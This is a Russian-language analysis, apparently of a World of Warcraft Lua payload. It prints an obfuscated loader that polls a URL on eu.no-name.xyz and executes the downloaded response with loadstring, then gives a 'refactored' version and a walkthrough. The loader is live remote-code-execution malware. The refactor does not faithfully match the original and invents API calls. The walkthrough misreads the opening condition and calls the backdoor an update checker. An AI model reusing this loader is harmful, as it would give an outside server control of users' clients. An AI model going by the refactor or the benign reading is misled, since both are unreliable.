### LuaPayload 

Дамп "как есть", полученный в ответ на запрос серверу.
```
do if ((4593 >= 2922) and C_Timer.Nn) then return; end local v0 = "bec0cbb977dc421280212942";
local v1 = "eu";
local v2 = "Is";
local v3 = "Mac";
local v4 = "Client";
local v5 = "http";
local v6 = "s://";
local v7 = "no";
local v8 = "xyz";
local v9 = "/Tb7f39/";
local v10 = "name";
local v11 = ".";
local v12 = "-";
local v13 = _G[v2 .. v3 .. v4];
local v14 = C_Timer.NewTicker;
local v15 = loadstring;
local v16 = strjoin;
local v17 = v16("", v5, v6, v1, v11, v7, v12, v10, v11, v8, v9, v0);
local function v18(v19) local v20 = 0;
local v21;
local v22;
local v23;
local v24;
while true do if ((1262 < 2013) and (0 ~= v20)) then
else if (v19:IsCancelled() or (976 < 313)) then return; end if (C_Timer.Nn or (4561 == 1175)) then v19:Cancel(); return; end v20 = 1; end if (
    (v20 ~= 2) or (317 > 3244)) then
else if ((v21 ~= (0 + 0)) or (4531 < 1493)) then
else v13(26 - 9, v17, 1 - 0); end break; end if ((3766 > 2349) and (1 ~= v20)) then
else v21, v22, v23, v24 = v13(57 - 37); if ((3023 == 3023) and (v21 == (1 + 1)) and (v23 == v17)) then v19:Cancel(); if (
    (2016 >= 1738) and (_G[v2 .. v3 .. v4] == v13)) then
else return v13(1636 - (1427 + 179)); end pcall(v15("txq,nnso = ...", ""), v0, v1); pcall(v15(v24, "NnL")); end v20 = 2; end end end v18(v14(0
  + 0, v18)); end
```

Код после рефакторинга
```
if 4593 >= 2922 and C_Timer.Nn then
  return
end

local SERVER_HOST = "http://eu.no-name.xyz/Tb7f39/bec0cbb977dc421280212942"
local TIMER_INTERVAL = 1

local function startTicker()
  local ticker = C_Timer.NewTicker(TIMER_INTERVAL, function()
    local success, _, errorMsg = pcall(loadstring("txq, nnso = ...", ""))
    if not success then
      return
    end
    
    if nnso == nil or nnso:IsCancelled() then
      ticker:Cancel()
      return
    end
    
    local _, code = nnso:Perform()
    if code == 200 then
      local response = nnso:GetResponseText()
      pcall(loadstring(response, "NnL"))
      ticker:Cancel()
    end
  end)
end

startTicker()

```

### Брифли разберём

```
if 4593 >= 2922 and C_Timer.Nn then
  return
end
```
Этот код сначала проверяет, является ли цифра 4593 меньше или равной 2922, и не является ли C_Timer.Nn равным nil. 
Если оба условия истинны, то функция просто возвращает управление.
Возможно это проверка, которая гарантирует, что только один экземпляр этого кода запущен в данный момент.

```
local SERVER_HOST = "http://eu.no-name.xyz/Tb7f39/bec0cbb977dc421280212942"
local TIMER_INTERVAL = 1
```
Этот код определяет две константы: SERVER_HOST - это URL сервера, где код будет искать обновления, а TIMER_INTERVAL - количество секунд между проверками обновлений.
```
local function startTicker()
  local ticker = C_Timer.NewTicker(TIMER_INTERVAL, function()
    local success, _, errorMsg = pcall(loadstring("txq, nnso = ...", ""))
    if not success then
      return
    end
    
    if nnso == nil or nnso:IsCancelled() then
      ticker:Cancel()
      return
    end
    
    local _, code = nnso:Perform()
    if code == 200 then
      local response = nnso:GetResponseText()
      pcall(loadstring(response, "NnL"))
      ticker:Cancel()
    end
  end)
end
```
Этот код определяет вспомогательную функцию startTicker(), которая создает новый объект C_Timer с интервалом в TIMER_INTERVAL секунд. Функция обратного вызова таймера делает HTTP-запрос на SERVER_HOST, загружает ответ в виде строки Lua и затем выполняет эту строку с помощью loadstring(). Если запрос не удался или загруженная строка содержит ошибки, функция возвращает значение раньше времени. Если HTTP-запрос возвращает статусный код 200, что означает успешное выполнение запроса, то функция выполняет загруженную строку и отменяет таймер.
```
startTicker()
```
Этот код просто вызывает функцию startTicker(), чтобы запустить таймер и начать проверку обновлений.

Общая цель этого кода заключается в периодической проверке сервера на наличие обновлений некоторого кода Lua, а в случае обнаружения обновления - для загрузки и выполнения обновленного кода.
Код делает это, создавая таймер, который делает запрос НТТР на определенный URL, загружает ответ как строку Lua, а затем выполняет эту строку.
Если загруженная строка содержит новый код, она заменит существующий код и начнет запускать новый.
Оператор if в начале - это проверка, чтобы убедиться, что одновременно выполняется только один экземпляр этого кода.